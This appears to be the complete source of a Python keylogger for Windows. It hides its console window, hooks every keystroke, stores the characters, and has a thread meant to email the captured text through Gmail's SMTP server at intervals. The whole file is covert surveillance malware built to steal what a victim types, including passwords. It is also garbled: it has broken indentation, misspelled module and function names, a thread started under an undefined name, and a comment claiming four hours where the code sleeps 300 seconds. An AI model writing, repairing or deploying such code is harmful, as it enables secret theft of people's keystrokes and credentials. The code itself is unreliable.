import pyHook
import win32gui
import pythoncom
import win32console

import threading
import smtplib
import time

email = 'send_information _to'

list = []

log_file = "log_file.txt"
window = win32console.GetConsoleWindow()

win32gui.ShowWindow(window,0)

def pressed_chars(event):
         if event.Ascii:
         f = open(log_file, "a")
         char = chr(event.Ascii)
         list.append(char)
         if char == "q" :
                     f.close()
                     exit()
         # (if "return")
         if event.Ascii == 13:
                      f.close()
                      #f.write("\n")
         f.close()
         #f.write(char)
def pump():
          proc = pyHook.HookManager()
          proc.KeyDown = pressed_chars
          proc.HookKeyboard()
          pythoncom.PlumpMessages()
  
def send_mail():
        while 1:
                #4 Hours
                time.sleep(300)
                #smtp server
                server = smtblib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.ehlo()
                server.login('gmail' , 'password')  
                msg = ''.join(list)
                server.sendmail('gmail' email , msg)
           
# create threads
w = threading.Thread(target=send_email)
w2 = threading.Thread(target=pump)

#start 

w.start()
w1.start()
                      








   

    